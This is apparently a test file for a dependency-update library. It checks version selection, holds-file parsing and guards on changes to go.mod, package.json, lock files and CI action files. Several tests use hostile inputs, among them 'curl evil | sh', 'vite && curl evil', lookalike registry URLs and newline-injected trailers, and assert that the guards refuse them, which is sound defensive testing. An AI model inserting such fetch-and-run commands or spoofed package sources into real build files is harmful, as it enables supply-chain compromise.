// Fork addition: tests of scripts/fork-deps-lib.mjs, with recorded registry
// answers. Run: node --test scripts/fork-deps-lib.test.mjs
import { test } from 'node:test';
import assert from 'node:assert/strict';
import * as lib from './fork-deps-lib.mjs';

const cutoff = lib.cutoffFor('2026-11-15', 7); // 2026-11-08T00:00:00Z

test('the cut-off is the start of the day minus the cool-down, the same all day', () => {
  assert.equal(cutoff.toISOString(), '2026-11-08T00:00:00.000Z');
  assert.equal(lib.cutoffFor('2026-11-15', 0).toISOString(), '2026-11-15T00:00:00.000Z');
  assert.throws(() => lib.cutoffFor('2026-11-15T10:00', 7));
  assert.throws(() => lib.cutoffFor('2026-11-15', -1));
  assert.throws(() => lib.cutoffFor('2026-11-15', 1.5));
});

test('a version published at the cut-off or later is not chosen; one a second before is', () => {
  const got = lib.choose('1.2.0', [
    { version: '1.2.1', time: '2026-11-07T23:59:59Z' },
    { version: '1.2.2', time: '2026-11-08T00:00:00Z' },
    { version: '1.3.0', time: '2026-11-14T12:00:00Z' },
  ], cutoff);
  assert.equal(got.minor.version, '1.2.1');
  assert.equal(got.major, null);
});

test('minor stays in the major, major is the newest newer major, pre-releases are skipped', () => {
  const got = lib.choose('4.5.14', [
    { version: '4.5.15', time: '2026-01-01T00:00:00Z' },
    { version: '5.4.0', time: '2026-01-01T00:00:00Z' },
    { version: '8.3.8', time: '2026-10-01T00:00:00Z' },
    { version: '9.0.0-beta.1', time: '2026-10-01T00:00:00Z' },
    { version: '8.4.0', time: '2026-11-10T00:00:00Z' },
  ], cutoff);
  assert.equal(got.minor.version, '4.5.15');
  assert.equal(got.major.version, '8.3.8');
});

test('0.x: a new minor is a major-class change', () => {
  const got = lib.choose('0.16.1', [
    { version: '0.16.2', time: '2026-01-01T00:00:00Z' },
    { version: '0.17.0', time: '2026-01-01T00:00:00Z' },
  ], cutoff);
  assert.equal(got.minor.version, '0.16.2');
  assert.equal(got.major.version, '0.17.0');
  assert.equal(lib.kindOf(lib.parseVersion('0.16.1'), lib.parseVersion('0.17.0')), 'major');
  assert.equal(lib.kindOf(lib.parseVersion('1.2.1'), lib.parseVersion('1.9.0')), 'minor');
});

test('a pre-release in use moves along its own pre-releases and to its release', () => {
  const got = lib.choose('5.0.0-alpha.177', [
    { version: '5.0.0-alpha.178', time: '2026-01-01T00:00:00Z' },
    { version: '5.0.0-beta.1', time: '2026-01-01T00:00:00Z' },
    { version: '6.0.0-alpha.1', time: '2026-01-01T00:00:00Z' },
  ], cutoff);
  assert.equal(got.minor.version, '5.0.0-alpha.178');
  assert.equal(got.major, null);
  assert.equal(lib.choose('5.0.0-alpha.177', [{ version: '5.0.0', time: '2026-01-01T00:00:00Z' }], cutoff).minor.version, '5.0.0');
});

test('ceilings: - never, N stays in N, N.N stays at or below N.N.x', () => {
  const list = [{ version: '1.5.9', time: '2026-01-01T00:00:00Z' }, { version: '1.6.0', time: '2026-01-01T00:00:00Z' }, { version: '2.0.0', time: '2026-01-01T00:00:00Z' }];
  assert.equal(lib.choose('1.5.0', list, cutoff, '1.5').minor.version, '1.5.9');
  assert.equal(lib.choose('1.5.0', list, cutoff, '1.5').major, null);
  assert.equal(lib.choose('1.5.0', list, cutoff, '1').minor.version, '1.6.0');
  assert.equal(lib.choose('1.5.0', list, cutoff, '1').major, null);
  assert.deepEqual(lib.choose('1.5.0', list, cutoff, '-'), { minor: null, major: null });
});

test('Go: +incompatible stays +incompatible, pseudo-versions are recognised', () => {
  const got = lib.choose('v26.1.5+incompatible', [
    { version: 'v26.1.6+incompatible', time: '2026-01-01T00:00:00Z' },
    { version: 'v28.5.2+incompatible', time: '2026-01-01T00:00:00Z' },
  ], cutoff, '26');
  assert.equal(got.minor.version, 'v26.1.6+incompatible');
  assert.equal(got.major, null);
  assert.ok(lib.isPseudo('v0.0.0-20260913233941-486c28b93357'));
  assert.ok(lib.isPseudo('v1.2.4-0.20230101120000-abcdefabcdef'));
  assert.ok(!lib.isPseudo('v1.2.3'));
});

test('chooseLazy asks for the newest times first and stops when both answers are known', async () => {
  const times = { 'v1.9.0': '2026-11-10T00:00:00Z', 'v1.8.0': '2026-10-01T00:00:00Z', 'v1.7.0': '2026-09-01T00:00:00Z', 'v2.0.0': '2026-09-01T00:00:00Z' };
  const asked = [];
  const got = await lib.chooseLazy('v1.5.0', ['v1.6.0', 'v1.7.0', 'v1.8.0', 'v1.9.0', 'v2.0.0', 'v2.1.0-rc.1'],
    async (v) => { asked.push(v); return times[v] || '2026-01-01T00:00:00Z'; }, cutoff);
  assert.equal(got.minor.version, 'v1.8.0');
  assert.equal(got.major.version, 'v2.0.0');
  assert.deepEqual(asked, ['v2.0.0', 'v1.9.0', 'v1.8.0']);
});

test('holds file: entries, groups, paths, and refusing malformed lines', () => {
  const h = lib.parseHolds('# c\ngo a/b - why not\nnpm x 1.5 because\ngroup npm react react-dom\npath src/pro - paid\n');
  assert.equal(lib.holdOf(h, 'go', 'a/b').ceiling, '-');
  assert.equal(lib.holdOf(h, 'go', 'a/b').reason, 'why not');
  assert.equal(lib.holdOf(h, 'npm', 'x').ceiling, '1.5');
  assert.deepEqual(h.groups, [{ eco: 'npm', names: ['react', 'react-dom'] }]);
  assert.deepEqual(h.paths, ['src/pro']);
  assert.throws(() => lib.parseHolds('go a/b -\n'), /expected/);
  assert.throws(() => lib.parseHolds('go a/b ^1 reason\n'), /ceiling/);
  assert.throws(() => lib.parseHolds('pip x - reason\n'), /expected/);
});

test('the repository holds file parses and holds what plan 37 holds back', async () => {
  const { readFileSync } = await import('node:fs');
  const h = lib.parseHolds(readFileSync(new URL('./fork-deps-holds.txt', import.meta.url), 'utf8'));
  for (const [eco, name] of [['go', 'github.com/kardianos/service'], ['go', 'github.com/rclone/rclone'], ['go', 'github.com/golang-jwt/jwt'],
    ['npm', '@jamesives/github-sponsors-readme-action'], ['bundled', 'nebula'], ['bundled', 'restic'], ['path', 'src/pro'], ['path', 'src/utils/cloud.go']]) {
    assert.equal(lib.holdOf(h, eco, name)?.ceiling, '-', `${eco} ${name}`);
  }
});

test('go.mod is read: go line, requires with indirect, replaced modules', () => {
  const m = lib.parseGoMod('module x\n\ngo 1.27.4\n\nrequire (\n\ta/b v1.2.3\n\tc/d v0.1.0 // indirect\n)\n\nrequire e/f v2.0.0+incompatible\n\nreplace a/b => g/h v1.0.0\n');
  assert.equal(m.go, '1.27.4');
  assert.deepEqual(m.requires.map((r) => [r.path, r.version, r.indirect]), [['a/b', 'v1.2.3', false], ['c/d', 'v0.1.0', true], ['e/f', 'v2.0.0+incompatible', false]]);
  assert.ok(m.replaced.has('a/b'));
  assert.deepEqual(lib.toolchainVersions(['v0.0.1-go1.27.5.linux-amd64', 'v0.0.1-go1.27.5.darwin-arm64', 'v0.0.1-go1.28rc1.linux-amd64']).map((t) => t.version), ['1.27.5']);
});

test('package.json: one entry changes, every other byte stays', () => {
  const text = '{\n  "name": "x",\n  "dependencies": {\n    "a": "^1.0.0",\n    "b": "~2.0.0"\n  },\n  "devDependencies": {\n    "a": "^1.0.0"\n  }\n}\n';
  const out = lib.setSpec(text, 'dependencies', 'a', '^1.0.0', '^1.4.0');
  assert.equal(out, text.replace('"a": "^1.0.0",', '"a": "^1.4.0",'));
  assert.throws(() => lib.setSpec(text, 'dependencies', 'c', '^1.0.0', '^2.0.0'));
  assert.deepEqual(lib.specParts('~2.0.0'), { op: '~', version: '2.0.0' });
  assert.equal(lib.specParts('>=1 <2'), null);
  assert.equal(lib.specParts('github:a/b'), null);
});

test('a lock file going back to older versions is noticed', () => {
  const before = new Map([['node_modules/debug', '4.4.3'], ['node_modules/ms', '2.1.3'], ['node_modules/x', '1.0.0']]);
  const after = new Map([['node_modules/debug', '4.1.1'], ['node_modules/ms', '2.1.3'], ['node_modules/x', '1.1.0']]);
  assert.deepEqual(lib.downgrades(before, after), ['debug 4.4.3 -> 4.1.1']);
});

test('action pins are read and changed by commit, the version in the comment', () => {
  const sha1 = 'b7ad1dad31e06c5925ef5d2fc7ad053ef454303e', sha2 = 'a'.repeat(40);
  const text = `steps:\n    - uses: actions/setup-go@${sha1} # v7.0.0\n      with: {}\n    - uses: ./local\n`;
  const u = lib.usesLines(text);
  assert.deepEqual(u.map((x) => [x.repo, x.sha, x.version]), [['actions/setup-go', sha1, 'v7.0.0']]);
  assert.equal(lib.setUses(text, 'actions/setup-go', sha1, sha2, 'v7.1.0'), text.replace(`${sha1} # v7.0.0`, `${sha2} # v7.1.0`));
  assert.throws(() => lib.setUses(text, 'actions/setup-node', sha1, sha2, 'v1.0.0'));
});

test('images: golang, node and Playwright (with its npm version) are renamed; nothing else', () => {
  const text = "docker run golang:1.27 x; node:26 and node:fs and node:26.1; mcr.microsoft.com/playwright:v1.65.1-noble 'npm i playwright@1.65.1'; docker:29-dind";
  assert.deepEqual(lib.imageRefs(text).map((r) => `${r.image}:${r.tag}`), ['golang:1.27', 'node:26', 'mcr.microsoft.com/playwright:1.65.1']);
  assert.equal(lib.replaceImage(text, 'node', '26', '28'), text.replace('node:26 and', 'node:28 and'));
  assert.equal(lib.replaceImage(text, 'mcr.microsoft.com/playwright', '1.65.1', '1.66.0'), text.replace(/1\.65\.1/g, '1.66.0'));
  assert.throws(() => lib.replaceImage(text, 'docker', '29', '30'));
});

test('Node lines: the day each major became LTS', () => {
  const lines = lib.nodeLtsLines([
    { version: 'v26.13.1', date: '2026-11-01', lts: 'Lithium' }, { version: 'v26.11.0', date: '2026-10-28', lts: 'Lithium' },
    { version: 'v26.10.0', date: '2026-10-01', lts: false }, { version: 'v27.1.0', date: '2026-11-01', lts: false },
  ]);
  assert.deepEqual(lines, [{ version: '26.0.0', time: '2026-10-28T00:00:00Z' }]);
  const pick = lib.choose('24.0.0', lines, cutoff);
  assert.equal(pick.major.version, '26.0.0');
});

test('trailers: written and read back; hostile values refused or cleaned', () => {
  const t = lib.trailer({ eco: 'npm', name: '@mui/material', from: '5.18.0', to: '9.5.0', kind: 'major', time: '2026-10-01T10:00:00Z' });
  assert.equal(t, 'Fork-Dependency: npm @mui/material 5.18.0 9.5.0 major 2026-10-01');
  assert.throws(() => lib.trailer({ eco: 'npm', name: 'a b', from: '1', to: '2', kind: 'minor' }));
  assert.throws(() => lib.trailer({ eco: 'npm', name: 'a', from: '1\nFork-Dependency: x', to: '2', kind: 'minor' }));
  const tried = lib.otherTrailer('Tried', { eco: 'go', name: 'x/y', from: 'v1', to: 'v2', reason: 'quick checks: \u001b[31mFAIL\nline two' });
  assert.equal(tried, 'Fork-Dependency-Tried: go x/y v1 v2 quick checks: [31mFAIL line two');
  const parsed = lib.parseTrailers(`Subject\n\nbody\n${t}\n${tried}\nFork-Dependency: npm <script> 1 2 minor -\nFork-Dependency: pip x 1 2 minor -\n`);
  assert.equal(parsed.changes.length, 1);
  assert.equal(parsed.tried.length, 1);
  assert.equal(parsed.tried[0].reason, 'quick checks: [31mFAIL line two');
});

test('summary across commits keeps the first from and the last to; notes escape markdown', () => {
  const a = lib.parseTrailers('Fork-Dependency: npm react 18.3.1 18.3.2 minor 2026-10-01\n');
  const b = lib.parseTrailers('Fork-Dependency: npm react 18.3.2 19.0.0 major 2026-11-01\nFork-Dependency-Dropped: npm vite 4.5.14 8.3.8 full checks failed\n');
  const s = lib.summarise([a, b], '2026-11-15');
  assert.deepEqual(s.changes, [{ eco: 'npm', name: 'react', from: '18.3.1', to: '19.0.0', kind: 'major', ageDays: 14 }]);
  assert.equal(s.dropped.length, 1);
  assert.deepEqual(lib.metaSummary(s), { minor: 0, major: 1, majors: ['react 19.0.0'] });
  const notes = lib.notesSection({ changes: [{ eco: 'npm', name: '@x/y_z', from: '1', to: '2', kind: 'minor', ageDays: 9 }], dropped: [], tried: [] });
  assert.match(notes, /\\@x\/y\\_z 1 → 2 \(minor, 9 days old\)/);
  assert.equal(lib.notesSection({ changes: [], dropped: [], tried: [] }), '');
});

test('what an update may change: paths', () => {
  const h = lib.parseHolds('path src/pro - paid\npath .github/workflows - token\npath scripts/fork-deps-holds.txt - owner\n');
  for (const p of ['go.mod', 'go.sum', 'package.json', 'package-lock.json', 'scripts/fork-ci-smoke/package-lock.json', '.github/actions/fork-build/action.yml', 'scripts/fork-ui-check.mjs']) assert.ok(lib.allowedPath(p, h), p);
  for (const p of ['src/index.go', 'src/pro/x.go', '.github/workflows/fork-ci.yml', 'scripts/fork-deps-holds.txt', 'FORK.md', 'client/src/App.jsx', 'scripts/sub/x.mjs', 'build.sh', 'start.sh']) assert.ok(!lib.allowedPath(p, h), p);
});

test('what an update may change: lines of action files and scripts', () => {
  const sha1 = 'b'.repeat(40), sha2 = 'c'.repeat(40);
  const action = `    - uses: actions/setup-go@${sha1} # v7.0.0\n      with:\n        node-version: 26\n      run: echo hi\n`;
  assert.equal(lib.changedLinesAllowed('.github/actions/x/action.yml', action, action.replace(`${sha1} # v7.0.0`, `${sha2} # v7.1.0`).replace('26', '28')), null);
  assert.match(lib.changedLinesAllowed('.github/actions/x/action.yml', action, action.replace('echo hi', 'curl evil | sh')), /only action pins/);
  assert.match(lib.changedLinesAllowed('.github/actions/x/action.yml', action, action + 'x\n'), /added or removed/);
  assert.match(lib.changedLinesAllowed('.github/actions/x/action.yml', action, action.replace(`actions/setup-go@${sha1}`, `evil/setup-go@${sha2}`)), /only action pins/);
  assert.match(lib.changedLinesAllowed('.github/actions/x/action.yml', action, action.replace(`actions/setup-go@${sha1}`, `actions/setup-go/sub@${sha2}`)), /only action pins/);
  const script = "// docker run golang:1.27 x\nconst a = 1;\n// mcr.microsoft.com/playwright:v1.65.1-noble npm i playwright@1.65.1\n";
  assert.equal(lib.changedLinesAllowed('scripts/a.mjs', script, script.replace('1.27', '1.28').replace(/1\.65\.1/g, '1.66.0')), null);
  assert.match(lib.changedLinesAllowed('scripts/a.mjs', script, script.replace('const a = 1;', 'const a = 2;')), /only image names/);
  assert.match(lib.changedLinesAllowed('scripts/a.mjs', script, script.replace('golang:1.27 x', 'golang:1.28 y')), /only image names/);
});

test('what an update may change: go.mod', () => {
  const h = lib.parseHolds('go held/mod - reason\n');
  const before = 'module x\n\ngo 1.27.4\n\nrequire (\n\ta/b v1.2.3\n\theld/mod v1.0.0\n\tc/d v0.1.0 // indirect\n)\n\nreplace a/b => g/h v1.0.0\n';
  assert.equal(lib.goModChangeAllowed(before, before.replace('v1.2.3', 'v1.3.0').replace('1.27.4', '1.27.5').replace('\tc/d v0.1.0 // indirect\n', '\tc/d v0.2.0 // indirect\n\te/f v1.0.0 // indirect\n'), h), null);
  assert.match(lib.goModChangeAllowed(before, before.replace('g/h v1.0.0', 'evil/h v1.0.0'), h), /other than versions/);
  assert.match(lib.goModChangeAllowed(before, before + 'toolchain go1.28.0\n', h), /toolchain/);
  assert.match(lib.goModChangeAllowed(before, before.replace('held/mod v1.0.0', 'held/mod v1.1.0'), h), /held module/);
  assert.match(lib.goModChangeAllowed(before, before.replace('module x', 'module y'), h), /other than versions/);
});

test('what an update may change: package.json and the lock file', () => {
  const before = JSON.stringify({ name: 'x', scripts: { build: 'vite' }, dependencies: { a: '^1.0.0' }, overrides: { b: '1.0.0' } });
  assert.equal(lib.packageJsonChangeAllowed(before, before.replace('^1.0.0', '^1.2.0')), null);
  assert.match(lib.packageJsonChangeAllowed(before, before.replace('"vite"', '"vite && curl evil"')), /other than dependency versions/);
  assert.match(lib.packageJsonChangeAllowed(before, before.replace('"a":"^1.0.0"', '"a":"^1.0.0","evil":"^1.0.0"')), /list changed/);
  assert.match(lib.packageJsonChangeAllowed(before, before.replace('^1.0.0', 'https://evil.example.org/a.tgz')), /unusual version/);
  assert.match(lib.packageJsonChangeAllowed(before, before.replace('"b":"1.0.0"', '"b":"2.0.0"')), /other than dependency versions/);
  const good = { packages: { '': { name: 'x' }, 'node_modules/a': { version: '1.2.0', resolved: 'https://registry.npmjs.org/a/-/a-1.2.0.tgz', integrity: 'sha512-' + 'A'.repeat(86) + '==' } } };
  assert.equal(lib.lockAllowed(JSON.stringify(good)), null);
  const evil = structuredClone(good); evil.packages['node_modules/a'].resolved = 'https://registry.npmjs.org.evil.example/a.tgz';
  assert.match(lib.lockAllowed(JSON.stringify(evil)), /not from registry/);
  const git = structuredClone(good); git.packages['node_modules/a'].resolved = 'git+ssh://git@github.com/a/a.git';
  assert.match(lib.lockAllowed(JSON.stringify(git)), /not from registry/);
  const bare = structuredClone(good); delete bare.packages['node_modules/a'].integrity;
  assert.match(lib.lockAllowed(JSON.stringify(bare)), /integrity/);
});
